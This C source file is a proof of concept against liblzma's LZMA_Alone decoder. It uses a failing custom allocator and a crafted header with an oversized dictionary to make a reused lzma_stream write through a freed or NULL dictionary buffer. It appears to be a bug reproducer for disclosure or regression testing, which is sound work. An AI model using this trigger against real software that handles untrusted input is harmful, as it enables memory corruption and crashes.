// SPDX-License-Identifier: 0BSD
//
// Proof of concept: after a dictionary (re)allocation failure, reusing
// an lzma_stream with lzma_alone_decoder() can make liblzma reuse a
// freed/NULL dictionary buffer while believing it is already the right
// size, producing a NULL/wild write once decoding resumes.
//
// Builds against the public liblzma API only (lzma.h), using a custom
// lzma_allocator (a documented, public extension point) whose alloc()
// callback simulates an allocation failure once the requested size
// exceeds a threshold.

#include <lzma.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define TOO_BIG_ALLOC (1U << 20)

static void *
my_alloc(void *opaque, size_t nmemb, size_t size)
{
	(void)opaque;
	(void)nmemb;

	if (size >= TOO_BIG_ALLOC)
		return NULL;

	return malloc(size);
}

static lzma_allocator my_allocator = { &my_alloc, NULL, NULL };

// A minimal valid .lzma (LZMA_Alone) stream: lc/lp/pb properties byte,
// a 4-byte little-endian dictionary size, an 8-byte "unknown" uncompressed
// size, followed by compressed data ending with an end-of-payload marker.
static uint8_t small_dict[] = {
	0x5d, 0x00, 0x10, 0x00, 0x00, 0xff, 0xff, 0xff,
	0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x24, 0x19,
	0x49, 0x98, 0x6f, 0x05, 0x15, 0x27, 0x27, 0x0d,
	0x76, 0x78, 0xd0, 0x2a, 0x68, 0x17, 0x15, 0xff,
	0xff, 0x75, 0xf8, 0x00, 0x00,
};

int
main(void)
{
	// Same payload, but with the declared dictionary size bumped from
	// 4 KiB up to 2 GiB (bytes 2-3 of the header), so that the
	// dictionary (re)allocation triggered for it exceeds our
	// allocator's threshold and fails with LZMA_MEM_ERROR.
	uint8_t big_dict[sizeof(small_dict)];
	memcpy(big_dict, small_dict, sizeof(small_dict));
	big_dict[2] = 0x00;
	big_dict[3] = 0x80;

	uint8_t out[256];

	lzma_stream strm = LZMA_STREAM_INIT;
	strm.allocator = &my_allocator;

	// 1) First use: small dictionary, succeeds and allocates the
	//    dictionary buffer at its "small" size.
	if (lzma_alone_decoder(&strm, UINT64_MAX) != LZMA_OK)
		return 1;
	strm.next_in = small_dict;
	strm.avail_in = sizeof(small_dict);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_STREAM_END)
		return 1;

	// 2) Reuse the same lzma_stream for a stream that needs a huge
	//    dictionary. The reallocation fails (LZMA_MEM_ERROR).
	if (lzma_alone_decoder(&strm, UINT64_MAX) != LZMA_OK)
		return 1;
	strm.next_in = big_dict;
	strm.avail_in = sizeof(big_dict);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	if (lzma_code(&strm, LZMA_FINISH) != LZMA_MEM_ERROR)
		return 1;

	// 3) Reuse the same lzma_stream again with the original small
	//    dictionary. This should succeed exactly like step 1 did.
	if (lzma_alone_decoder(&strm, UINT64_MAX) != LZMA_OK)
		return 1;
	strm.next_in = small_dict;
	strm.avail_in = sizeof(small_dict);
	strm.next_out = out;
	strm.avail_out = sizeof(out);
	lzma_code(&strm, LZMA_FINISH);

	lzma_end(&strm);
	return 0;
}
